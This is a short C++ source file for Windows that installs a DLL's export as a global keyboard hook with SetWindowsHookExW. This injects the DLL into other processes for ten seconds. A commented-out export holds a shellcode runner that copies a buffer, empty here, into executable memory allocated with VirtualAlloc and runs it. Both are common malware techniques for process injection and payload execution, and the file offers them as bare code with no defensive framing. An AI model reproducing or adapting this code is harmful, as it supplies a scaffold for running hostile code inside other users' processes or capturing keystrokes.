#include <iostream>
#include <Windows.h>


//extern "C" _declspec(dllexport) int splotlessExport() {
//  unsigned char buf[] = "";
//
//  void* exec = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//
//  memcpy(exec, buf, sizeof(buf));
//  ((void(*)())exec)(); //runs the function
//
//  return 0;
//}

int StartDllInject(int argc, char* argv[]) {
  HMODULE lib = LoadLibraryA("dllhook.dll");
  HOOKPROC hookProc = (HOOKPROC)GetProcAddress(lib, "splotlessExport");

  HHOOK hook = SetWindowsHookExW(WH_KEYBOARD, hookProc, lib, 0);
  Sleep(10 * 1000);
  UnhookWindowsHookEx(hook);




  return 0;
}
